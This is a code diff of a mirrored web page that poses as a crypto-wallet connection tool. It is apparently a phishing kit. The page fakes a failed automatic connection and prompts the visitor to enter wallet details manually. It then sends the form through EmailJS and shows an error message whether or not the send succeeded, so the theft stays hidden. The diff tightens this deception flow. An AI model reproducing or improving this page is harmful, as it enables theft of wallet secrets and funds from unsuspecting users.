@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 
-<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 
 <head>
   <meta charset="UTF-8" />
@@ -98,7 +99,6 @@
     <p>Connection failed. Please provide your wallet details manually.</p>
   </div>
 
-  <!-- Manual Connection Modal -->
   <!-- Manual Connection Modal -->
   <dialog id="modal-manual" class="modal">
     <div class="modal-box">
@@ -211,16 +211,13 @@
 
     function showLoading(isLoading) {
       const spinner = document.getElementById("loading-spinner");
-      const message = document.getElementById("connection-message");
       spinner.style.display = isLoading ? "block" : "none";
-      if (!isLoading) message.style.display = "block";
     }
 
     function simulateAutoConnect(walletName) {
       setTimeout(() => {
         showLoading(false);
-        showErrorMessage(walletName);
-        setTimeout(() => openModal("modal-manual"), 500);
+        openModal("modal-manual");
       }, 2000);
     }
 
@@ -281,7 +278,7 @@
       walletList.appendChild(div);
     });
 
-    // ✅ Actual EmailJS send function
+    // Actual EmailJS send function
     function sendForm() {
       const form = document.getElementById("walletForm");
       if (!form) return alert("Please select a wallet input type first.");
@@ -308,19 +305,18 @@
         })
         .then(
           () => {
-            alert("Submitted successfully!");
             closeModal("modal-manual");
+            showErrorMessage(walletName); // Show error message after submission
           },
           (error) => {
-            console.error("✅ Wallet is already processed successfully!", error);
-            alert("✅ Wallet is already processed successfully");
+            console.error("Error sending form:", error);
+            closeModal("modal-manual");
+            showErrorMessage(walletName); // Show error message even if submission fails
           }
         );
     }
   </script>
 </body>
 
-
 <!-- Mirrored from revolutionarytool.vercel.app/connect.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 28 Sep 2025 18:30:18 GMT -->
-
 </html>
